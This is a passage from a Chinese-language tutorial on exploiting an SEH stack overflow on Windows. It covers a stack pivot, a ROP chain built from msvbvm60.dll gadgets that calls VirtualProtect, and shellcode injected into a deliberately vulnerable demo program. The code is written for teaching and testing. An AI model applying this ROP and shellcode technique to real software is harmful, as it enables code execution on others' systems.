handler设法让ESP（栈顶指针）重新指向由溢出内容覆盖的栈区域。当我们的断点被击中时，检查ESP的值，我们可以在0x010FF3C0处看到一个返回NTDLL.DLL的地址（无用），其后是另一个位于我们所能控制的栈范围（0x010FF4C4）下方的地址（也无用），它位于0x010FF3C4处。然而，0x010FF3C8处的第三个值0x010FF3A74直接落在从0x010FFA0C开始的受控区域的地址范围内，其偏移值为0x64。重新审视异常处理程序的原型，就会发现这第三个值（代表传递给处理程序的第二个参数）对应的是Windows传递给SEH handler的“已建帧”的指针。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">EXCEPTION_DISPOSITION __cdecl <span class="title">SehHandler</span><span class="params">(EXCEPTION_RECORD* pExceptionRecord, <span class="type">void</span>* pEstablisherFrame, CONTEXT* pContextRecord, <span class="type">void</span>* pDispatcherContext)</span></span></span><br></pre></td></tr></table></figure><p>在我们的调试器中，检查栈中0x010FF3A74这个地址处的内容，我们可以更进一步地了解这个参数（也称为NSEH）的指向。</p><p><img src="/.io//Picture24-1707050428583.png" alt="img"></p><p>果然，我们可以看到，这个地址指向我们的溢出所控制的栈的一个区域（现在该区域已经被喷入的handler地址填满了）。具体来说，它直接指向前面提到的EXCEPTION_REGISTRATION_RECORD结构体的开始位置，而我们早就覆盖了这个结构体并用它来劫持EIP。在理想情况下，我们伪造的SEH handler会将ESP设置为[ESP + 8]，并且我们会将ROP链的开头部分放在被我们的溢出内容覆盖的EXCEPTION_REGISTRATION_RECORD结构体的开始处。对于这种类型的栈pivot，一个理想的gadget是POP REG;POP REG;POP ESP;RET或这种逻辑的一些变体，然而，msvbvm60.dll中并没有这种gadget，我不得不设法设计一个不同的解决方案。如前所述，当NTDLL将EIP重定向到我们伪造的SEH handler时，ESP在栈上的偏移量0x64C已经超出了我们用溢出控制的区域（具体来说，跑到该区域的下方了）。因此，对于栈pivot的这个问题，一个不太优雅的解决方案就是直接给ESP加上一个大于或等于0x64C的值。Ropper提供了一个功能，可以提取潜在的栈pivot gadget：</p><p><img src="/.io//Picture25-1707050428583.png" alt="img"></p><p>ADD ESP，0x1004 ; RET是一个略显混乱的gadget：它超出溢出开始处0x990个字节，但由于它是唯一一个值大于0x64C的ADD ESP，因此别无选择。这个栈pivot会让ESP从我们的溢出起始处超出0x990或0x98C个字节（当然，对于同一应用程序的不同实例以及Windows的不同版本来说，该值还能会有所变化）。这意味着我们需要在实际ROP链开始之前，用0x98C个垃圾字节和ROPNOP来填充溢出。</p><p><img src="/.io//Picture26-1707050428583.png" alt="img"></p><p>将这些知识整合到一段代码中：</p><p>(为了避免引发本机反应，以下代码需要在虚拟机中运行)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdint&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> Exploit[] =</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;AAAAAAAAAAAAAAAA&quot;</span> <span class="comment">// 16 bytes for buffer length</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;AAAA&quot;</span> <span class="comment">// Stack Cookie</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;AAAA&quot;</span> <span class="comment">// EBP</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;AAAA&quot;</span> <span class="comment">// Return address</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;AAAA&quot;</span> <span class="comment">// Overflow() | Param #1 | pInputBuf</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;AAAA&quot;</span> <span class="comment">// Overflow() | Param #2 | dwInputBufSize</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;DDDD&quot;</span> <span class="comment">// EXECEPTION_REGISTRATION_RECORD.Next</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xf3\x28\x0f\x66&quot;</span><span class="comment">// EXECEPTION_REGISTRATION_RECORD.Handler | 0x660f28f3 | ADD ESP, 0x1004; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xf9\x28\x0f\x66&quot;</span> <span class="comment">// 0x660F28F9 | ROPNOP</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ROP chain begins</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// EAX = NOP sled</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ECX = Old protection (writable address)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// EDX = PAGE_EXECUTE_READWRITE</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// EBX = Size</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// EBP = VirtualProtect return address (JMP ESP)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ESI = KERNEL32.DLL!VirtualProtect</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// EDI = ROPNOP</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x54\x1e\x00\x66&quot;</span> <span class="comment">// 0x66001e54 | Gadget #1 | POP ESI ; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xd0\x10\x00\x66&quot;</span> <span class="comment">// 0x660010d0 -&gt; ESI | &lt;msvbvm60.dll!VirtualProtect thunk&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xfc\x50\x05\x66&quot;</span> <span class="comment">// 0x660550fc | Gadget #2 | MOV EAX, DWORD [ESI] ; POP ESI; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xef\xbe\xad\xde&quot;</span> <span class="comment">// Junk</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xf8\x9f\x0f\x66&quot;</span> <span class="comment">// 0x660f9ff8 | Gadget #3 | XCHG EAX, ESI; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x1f\x98\x0e\x66&quot;</span> <span class="comment">// 0x660e981f | Gadget #4 | POP EAX; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span> <span class="comment">// NOP sled -&gt; EAX | JMP ESP will point here</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xf0\x1d\x00\x66&quot;</span> <span class="comment">// 0x66001df0 | Gadget #5 | POP EBP; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xea\xcb\x01\x66&quot;</span> <span class="comment">// 0x6601CBEA -&gt; EBP |</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x10\x1f\x00\x66&quot;</span> <span class="comment">// 0x66001f10 | Gadget #6 | POP EBX; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x00\x20\x00\x00&quot;</span> <span class="comment">// 0x2000 -&gt; EBX | VirtualProtect() | Param #2 | dwSize</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x21\x44\x06\x66&quot;</span> <span class="comment">// 0x66064421 | Gadget #7 | POP EDX; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x40\x00\x00\x00&quot;</span> <span class="comment">// 0x40 -&gt; EDX | VirtualProtect() | Param #3 | flNewProtect | PAGE_EXECUTE_READWRITE</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xf2\x1f\x00\x66&quot;</span> <span class="comment">// 0x66001ff2 | Gadget #8 | POP ECX; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x00\xa0\x10\x66&quot;</span> <span class="comment">// 0x6610A000 -&gt; ECX | VirtualProtect() | Param #4 | lpflOldProtect</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x5b\x57\x00\x66&quot;</span> <span class="comment">// 0x6600575b | Gadget #9 | POP EDI; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xf9\x28\x0f\x66&quot;</span> <span class="comment">// 0x660F28F9 -&gt; EDI |</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x54\x12\x05\x66&quot;</span> <span class="comment">// 0x66051254 | Gadget #10 | PUSHAD; RET</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 0x660F28F9 | Gadget #11 | ROPNOP | returns into VirtualProtect</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 0x6601CBEA | Gadget #12 | PUSH ESP; RET | return address from VirtualProtect</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Shellcode</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x55\x89\xe5\x68\x88\x4e\x0d\x00\xe8\x53\x00\x00\x00\x68\x86\x57&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x0d\x00\x50\xe8\x94\x00\x00\x00\x68\x33\x32\x00\x00\x68\x55\x73&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x65\x72\x54\xff\xd0\x68\x1a\xb8\x06\x00\x50\xe8\x7c\x00\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x6a\x64\x68\x70\x77\x6e\x65\x89\xe1\x68\x6e\x65\x74\x00\x68\x6f&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x72\x72\x2e\x68\x65\x73\x74\x2d\x68\x66\x6f\x72\x72\x68\x77\x77&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x77\x2e\x89\xe2\x6a\x00\x52\x51\x6a\x00\xff\xd0\x89\xec\x5d\xc3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x55\x89\xe5\x57\x56\xbe\x30\x00\x00\x00\x64\xad\x8b\x40\x0c\x8b&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x78\x18\x89\xfe\x31\xc0\xeb\x04\x39\xf7\x74\x28\x85\xf6\x74\x24&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x8d\x5e\x24\x85\xdb\x74\x14\x8b\x4b\x04\x85\xc9\x74\x0d\x6a\x01&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x51\xe8\x5d\x01\x00\x00\x3b\x45\x08\x74\x06\x31\xc0\x8b\x36\xeb&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xd7\x8b\x46\x10\x5e\x5f\x89\xec\x5d\xc2\x04\x00\x55\x89\xe5\x81&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xec\x30\x02\x00\x00\x8b\x45\x08\x89\x45\xf8\x8b\x55\xf8\x03\x42&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot; \x83\xc0\x04\x89\x45\xf0\x83\xc0\x14\x89\x45\xf4\x89\xc2\x8b&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x45\x08\x03\x42\x60\x8b\x4a\x64\x89\x4d\xd0\x89\x45\xfc\x89\xc2&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x8b\x45\x08\x03\x42\x20\x89\x45\xec\x8b\x55\xfc\x8b\x45\x08\x03&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x42\x24\x89\x45\xe4\x8b\x55\xfc\x8b\x45\x08\x03\x42\x1c\x89\x45&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xe8\x31\xc0\x89\x45\xe0\x89\x45\xd8\x8b\x45\xfc\x8b\x40\x18\x3b&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x45\xe0\x0f\x86\xd2\x00\x00\x00\x8b\x45\xe0\x8d\x0c\x85\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x00\x00\x8b\x55\xec\x8b\x45\x08\x03\x04\x11\x89\x45\xd4\x6a\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x50\xe8\xbd\x00\x00\x00\x3b\x45\x0c\x0f\x85\xa1\x00\x00\x00\x8b&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x45\xe0\x8d\x14\x00\x8b\x45\xe4\x0f\xb7\x04\x02\x8d\x0c\x85\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x8b\x55\xe8\x8b\x45\x08\x03\x04\x11\x89\x45\xd8\x8b&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x4d\xfc\x89\xca\x03\x55\xd0\x39\xc8\x7c\x7f\x39\xd0\x7d\x7b\xc7&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x45\xd8\x00\x00\x00\x00\x31\xc9\x8d\x9d\xd0\xfd\xff\xff\x8a\x14&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x08\x80\xfa\x00\x74\x20\x80\xfa\x2e\x75\x15\xc7\x03\x2e\x64\x6c&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x6c\x83\xc3\x04\xc6\x03\x00\x8d\x9d\xd0\xfe\xff\xff\x41\xeb\xde&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x88\x13\x41\x43\xeb\xd8\xc6\x03\x00\x8d\x9d\xd0\xfd\xff\xff\x6a&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x00\x53\xe8 \x00\x00\x00\x50\xe8\xa3\xfe\xff\xff\x85\xc0\x74&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x29\x89\x45\xdc\x6a\x00\x8d\x95\xd0\xfe\xff\xff\x52\xe8\x21\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x00\x00\x50\xff\x75\xdc\xe8\xd1\xfe\xff\xff\x89\x45\xd8\xeb\x0a&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x8d\x45\xe0\xff\x00\xe9\x1f\xff\xff\xff\x8b\x45\xd8\x89\xec\x5d&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xc2\x08\x00\x55\x89\xe5\x57\x8b\x4d\x08\x8b\x7d\x0c\x31\xdb\x80&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x39\x00\x74\x14\x0f\xb6\x01\x0c\x60\x0f\xb6\xd0\x01\xd3\xd1\xe3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x41\x85\xff\x74\xea\x41\xeb\xe7\x89\xd8\x5f\x89\xec\x5d\xc2\x08&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Overflow</span><span class="params">(<span class="type">uint8_t</span>* pInputBuf, <span class="type">uint32_t</span> dwInputBufSize)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> Buf[<span class="number">16</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(Buf, pInputBuf, dwInputBufSize);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int32_t</span> <span class="title">wmain</span><span class="params">(<span class="type">int32_t</span> nArgc, <span class="type">const</span> <span class="type">wchar_t</span>* pArgv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> Junk[<span class="number">0x5000</span>] = &#123; <span class="number">0</span> &#125;; <span class="comment">// Move ESP lower to ensure the exploit data can be accomodated in the overflow</span></span><br><span class="line"></span><br><span class="line">HMODULE hModule = <span class="built_in">LoadLibraryW</span>(<span class="string">L&quot;msvbvm60.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__asm &#123;</span><br><span class="line"></span><br><span class="line">Push0xdeadc0de<span class="comment">// Address of handler function</span></span><br><span class="line"></span><br><span class="line">PushFS : [<span class="number">0</span>]<span class="comment">// Address of previous handler</span></span><br><span class="line"></span><br><span class="line">Mov FS : [<span class="number">0</span>] , Esp<span class="comment">// Install new EXECEPTION_REGISTRATION_RECORD</span></span><br><span class="line"></span><br><span 